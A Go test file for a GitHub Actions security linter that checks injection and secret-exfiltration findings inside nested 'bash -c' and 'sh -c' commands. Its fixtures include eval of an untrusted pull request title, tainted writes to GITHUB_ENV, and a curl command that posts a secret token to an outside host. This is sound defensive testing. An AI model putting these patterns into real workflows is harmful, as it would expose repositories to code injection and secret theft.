package rules

import (
	"slices"
	"strings"
	"testing"

	"github.com/gh-intel/sisakulint/actions/lint"
)

// nestedShellKinds are the kinds of the findings of code-injection,
// envvar-injection and secret-exfiltration on a workflow on event whose
// step has env and run, sorted, with their certainty.
func nestedShellKinds(t *testing.T, event, env, run string) []string {
	t.Helper()
	files := wfFile("on: " + event + "\npermissions: {}\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n" + env + "        run: " + run + "\n")
	rep, _, _ := checkRules(t, []lint.Rule{CodeInjection, EnvvarInjection, SecretExfiltration}, files, exfilStore(t))
	var out []string
	for _, f := range rep.FindingsWith(lint.CertaintyConfirmed, lint.CertaintyConditional) {
		out = append(out, f.Args.KindID().String()+" "+f.Certainty.String())
	}
	for _, g := range rep.FindingsWith(lint.CertaintyInconclusive) {
		out = append(out, g.InconclusiveKind.String())
	}
	slices.Sort(out)
	return out
}

// TestNestedShell: the code after -c of bash and sh in single quotes is
// read as a script of its own that has the variables of env, so each
// script gives the findings of the same script run by the step itself.
func TestNestedShell(t *testing.T) {
	const title = "          T: ${{ github.event.pull_request.title }}\n"
	const token = "          TOK: ${{ secrets.MY_TOKEN }}\n"
	const prt = "pull_request_target"
	const issueTitle = "          T: ${{ github.event.issue.title }}\n"
	for _, tc := range []struct {
		name, event, env, nested, control string
	}{
		{"code-injection", prt, title, `bash -c 'eval "$T"'`, `eval "$T"`},
		{"envvar-injection", prt, title, `bash -c 'echo "X=$T" >> "$GITHUB_ENV"'`, `echo "X=$T" >> "$GITHUB_ENV"`},
		{"secret-exfiltration", "push", token, `sh -c 'curl -d "$TOK" https://example.com'`, `curl -d "$TOK" https://example.com`},
		{"sudo, -e before -c", prt, title, `sudo bash -ec 'eval "$T"'`, `eval "$T"`},
	} {
		want := nestedShellKinds(t, tc.event, tc.env, tc.control)
		if len(want) == 0 {
			t.Fatalf("%s: the control gives nothing", tc.name)
		}
		if got := nestedShellKinds(t, tc.event, tc.env, tc.nested); !slices.Equal(got, want) {
			t.Errorf("%s: got\n%s\nwant\n%s", tc.name, strings.Join(got, "\n"), strings.Join(want, "\n"))
		}
	}
	for _, tc := range []struct{ name, run string }{
		{"assigned before", `T=x; bash -c 'eval "$T"'`},
		{"assigned before, written to GITHUB_ENV", `T=x; bash -c 'echo "X=$T" >> "$GITHUB_ENV"'`},
		{"assigned for the command", `T=x bash -c 'eval "$T"'`},
		{"env -i", `env -i bash -c 'eval "$T"'`},
		{"env assigns", `env T=x bash -c 'eval "$T"'`},
		{"export -n", `export -n T; bash -c 'eval "$T"'`},
		{"declare +x", `declare +x T; bash -c 'eval "$T"'`},
		{"a script of a file", `bash ./x.sh 'eval "$T"'`},
		{"the code is data of the nested shell", `bash -c 'echo "$T"'`},
	} {
		if got := nestedShellKinds(t, "issues", issueTitle, tc.run); len(got) != 0 {
			t.Errorf("%s: got %q", tc.name, got)
		}
	}
	if got := nestedShellKinds(t, "push", "          KEY: ${{ secrets.KEY }}\n", `KEY=x; sh -c 'curl -d "$KEY" https://example.com'`); len(got) != 0 {
		t.Errorf("a secret assigned before: got %q", got)
	}
}
